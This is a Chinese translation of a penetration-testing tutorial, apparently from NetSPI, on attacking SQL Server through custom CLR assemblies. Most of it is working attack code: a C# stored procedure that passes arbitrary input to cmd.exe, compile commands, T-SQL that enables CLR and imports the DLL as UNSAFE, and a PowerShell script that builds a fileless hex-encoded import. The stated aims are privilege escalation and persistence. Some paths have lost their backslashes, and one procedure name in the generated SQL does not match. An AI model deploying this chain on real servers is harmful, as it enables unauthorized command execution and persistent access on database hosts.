# 【技术分享】攻击SQL Server CLR程序集
|
##### 译文声明
本文是翻译文章，文章来源：netspi.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[ **兄弟要碟吗**](http://bobao.360.cn/member/contribute?uid=2874729223)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
在这个博客中，我会扩展Nathan Kirk博客CLR系列的CLR组件攻击。 我将介绍如何创建，导入，导出和修改SQL
Server中的CLR程序集，以达到提升权限，执行系统命令和持久性等目的。我还将分享一些使用PowerUpSQL在Active
Directory环境中更大规模执行(批量)CLR攻击的技巧。
**什么是SQL Server中的自定义CLR程序集？**
为了这个博客可以更好的说明，我们将定义一个公共语言运行库（CLR）组件作为一个.NET的DLL（或一组DLL）可以导入到SQL服务器。一旦导入，DLL方法就可以链接到存储过程，并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL
Server本地功能的一个很好的方式，但自然也为攻击者创造了机会。
**如何为SQL Server定制一个自定义的CLR DLL?**
下面是根据Nathan
Kirk的操作和一些文章实现的利用微软C#执行系统命令的示例。你可以根据需要对代码作出修改，当你修改完毕后将文件保存至“c:tempcmd_exec.cs”。
    using System;
    using System.Data;
    using System.Data.SqlClient;
    using System.Data.SqlTypes;
    using Microsoft.SqlServer.Server;
    using System.IO;
    using System.Diagnostics;
    using System.Text;
    public partial class StoredProcedures
    {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void cmd_exec (SqlString execCommand)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:WindowsSystem32cmd.exe";
            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            // Create the record and specify the metadata for the columns.
            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
            // Mark the beginning of the result set.
            SqlContext.Pipe.SendResultsStart(record);
            // Set values for each column in the row
            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
            // Send the row back to the client.
            SqlContext.Pipe.SendResultsRow(record);
            // Mark the end of the result set.
            SqlContext.Pipe.SendResultsEnd();
            proc.WaitForExit();
            proc.Close();
        }
    };
现在我们使用csc.exe将“c:tempcmd_exec.cs”编译成dll。在默认情况下即使你没有安装Visual
Studio,csc.exe编译器是附带.NET框架的，我们使用下面的PowerShell命令来找到它。
    Get-ChildItem -Recurse "C:WindowsMicrosoft.NET" -Filter "csc.exe" | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
如果你找到了csc.exe，你可以使用下面的命令将“c:tempcmd_exec.cs”编译成dll文件。
    C:WindowsMicrosoft.NETFramework64v4.0.30319csc.exe /target:library c:tempcmd_exec.cs
**  
**
**如何导入我的CLR DLL到SQL Server？**
****
要将dll导入SqlServer，需要SQL登录的权限为sysadmin，有CREATE ASSEMBLY权限或ALTER
ASSEMBLY权限。然后按照以下步骤注册dll并且将其链接到存储过程，以便使用TSQL执行cmd_exec方法。
以sysadmin身份登录到SqlServer，并用下面TSQL查询：
    -- Select the msdb database
    use msdb
    -- Enable show advanced options on the server
    sp_configure 'show advanced options',1
    RECONFIGURE
    GO
    -- Enable clr on the server
    sp_configure 'clr enabled',1
    RECONFIGURE
    GO
    -- Import the assembly
    CREATE ASSEMBLY my_assembly
    FROM 'c:tempcmd_exec.dll'
    WITH PERMISSION_SET = UNSAFE;
    -- Link the assembly to a stored procedure
    CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
    GO
现在，你应该可以通过“msdb”数据库中的“cmd_exec”存储过程执行系统命令了，如下面的示例所示。
完成后你可以使用下面的sql语句删掉该过程和程序集
**如何将我的CLR DLL转换成一个十六进制字符串并在没有文件的情况下导入它?**
CLR程序集导入SQLServer时不必一定要引用一个dll文件，“CREATE ASSEMBLY”也接受一个十六进制的字符串表示CLR
DLL文件。下面是一个PowerShell脚本示例，演示了如何将你的“cmd_exec.dll”文件转换到sql命令中，它可以用来创建没有物理文件引用的程序集。
    # Target file
    $assemblyFile = "c:tempcmd_exec.dll"
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder = New-Object -Type System.Text.StringBuilder 
    $stringBuilder.Append("CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x") | Out-Null
    # Read bytes from file
    $fileStream = [IO.File]::OpenRead($assemblyFile)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }
    # Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
    # Build create procedure command
    $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
    # Create run os command
    $stringBuilder.AppendLine("EXEC[dbo].[cmd_exec] 'whoami'") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
    # Create file containing all commands
    $stringBuilder.ToString() -join "" | Out-File c:tempcmd_exec.txt
如果一切顺利“c:tempcmd_exec.txt”文件应该包含以下SQL语句。在该示例中，十六进制字符串已被截断，但是你的长度应该更长。
    -- Select the MSDB database
    USE msdb
    -- Enable clr on the server
    Sp_Configure 'clr enabled', 1
    RECONFIGURE
    GO
    -- Create assembly from ascii hex
    CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
    0x4D5A90000300000004000000F[TRUNCATED]
    WITH PERMISSION_SET = UNSAFE 
    GO 
    -- Create procedures from the assembly method cmd_exec
    CREATE PROCEDURE [dbo].[my_assembly] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec]; 
    GO 
    -- Run an OS command as the SQL Server service account
    EXEC[dbo].[cmd_exec] 'whoami' 
    GO